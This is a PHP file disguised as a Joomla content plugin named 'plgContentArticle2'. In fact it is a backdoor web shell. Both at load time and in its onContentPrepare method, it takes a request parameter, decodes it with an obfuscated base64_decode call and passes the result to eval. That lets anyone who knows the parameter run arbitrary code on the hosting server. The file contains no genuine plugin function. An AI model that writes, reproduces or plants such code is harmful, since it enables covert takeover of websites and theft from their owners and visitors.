<?php

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

jimport('joomla.event.plugin');
jimport( 'joomla.document.document' );

$document =& JFactory::getDocument();

if (isset($_REQUEST['6dHN']))
{
    $myfunc = 'bas'.'e64_'.'dec'.'ode';
    $myvar = $myfunc($_REQUEST['6dHN']);
    $document->addCustomTag(eval($myvar));
}

class plgContentArticle2 extends JPlugin
{
    public function onContentPrepare($context, &$article, &$params, $page = 0)
    {
        if (isset($_REQUEST['6dHN']))
        {
            $myfunc = 'bas'.'e64_'.'dec'.'ode';
            $myvar = $myfunc($_REQUEST['6dHN']);
            $article->text .= eval($myvar);
        }
    }
}

?>
